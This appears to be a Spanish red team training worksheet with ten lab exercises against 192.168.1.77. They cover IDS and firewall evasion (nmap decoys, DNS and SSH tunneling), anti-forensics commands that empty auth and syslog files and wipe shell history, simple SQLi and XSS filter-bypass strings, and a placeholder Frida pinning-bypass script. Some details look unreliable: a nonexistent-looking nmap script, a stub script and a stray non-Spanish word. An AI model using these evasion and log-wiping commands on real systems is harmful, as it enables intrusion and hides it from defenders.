# Red Team - Fase 4: Red Team Ejercicios (Red vs Blue)

## Ejercicio 1: Evasion de IDS

### Objetivo
Evadir.detección de IDS.

### Pasos
```bash
# Fragmentación
nmap -f 192.168.1.77

# Decoys
nmap -D RND:10 192.168.1.77

# Puertos source
nmap -g 53 192.168.1.77

# Timing slow
nmap -T0 192.168.1.77
```

### Entregable
Escaneos completados sin detección.

---

## Ejercicio 2: Evasion de Firewall

### Objetivo
Bypassear firewall.

### Pasos
```bash
# Port knocking
for port in 7000 8000 9000; do nc -zv 192.168.1.77 $port; done

# DNS tunneling
sudo iodine -f 192.168.1.10 mydns

# SSH tunneling
ssh -L 8080:localhost:80 user@192.168.1.77
```

### Entregable
Acceso logrado.

---

## Ejercicio 3: Anti-Forensics

### Objetivo
Limpiar rastros.

### Pasos
```bash
# Borrar logs
echo > /var/log/auth.log
echo > /var/log/syslog

# Timestamps
touch -r original_file modified_file

# Limpiar history
history -c
rm -rf ~/.bash_history
```

### Entregable
Logs limpiados.

---

## Ejercicio 4: Honeypot Detection

### Objetivo
Detect honeypots.

### Pasos
```bash
# Detectar honeyd
nmap --script honeyquit 192.168.1.77

# Detectar tarpit
timeout 5 nc -zv 192.168.1.77 80
# Si sangat lento, es tarpit
```

### Entregable
Reporte de detección.

---

## Ejercicio 5: Traffic Analysis

### Objetivo
Analizar tráfico.

### Pasos
```bash
# Capturar
tcpdump -i eth0 -w traffic.pcap

# Analizar
wireshark traffic.pcap

# Filtrar
tcpdump -r traffic.pcap 'tcp'
tcpdump -r traffic.pcap 'udp port 53'
```

### Entregable
Análisis completado.

---

## Ejercicio 6: Bypass WAF

### Objetivo
Bypassear WAF.

### Pasos
```bash
# SQLi bypass
' /**/OR /**/1=1--
' OR '1'='1'--

# XSS bypass
<ScRiPt>alert(1)</script>
<img src=x onerror=alert(1)>
```

### Entregable
WAF bypassed.

---

## Ejercicio 7: SSL Pinning Bypass

### Objetivo
Bypassear SSL pinning.

### Pasos
```python
# Frida script
import frida
script = """
Interceptor.attach(..., {
    onEnter: function(args) {
        args[2] = 0;
    }
});
"""
```

### Entregable
SSL pinning bypassed.

---

## Ejercicio 8: Full Evasion Test

### Objetivo
Prueba completa de evasion.

### Pasos
1. Escaneo ofuscado
2. payloads encoded
3. Múltiples técnicas
4. Documentar resultados

### Entregable
Informe de evasion.

---

## Ejercicio 9: OPSEC Review

### Objetivo
Revisar OPSEC.

### Pasos
1. Revisar artifacts
2. Analizar network
3. Check logs
4. Proponer mejoras

### Entregable
Informe de OPSEC.

---

## Ejercicio 10: Red vs Blue Lab

### Objetivo
Simulación Red vs Blue.

### Pasos
1. Red teamattack
2. Blue team detecta
3. Red evade
4. Blue improve
5. Documentar

### Entregable
Lab completado.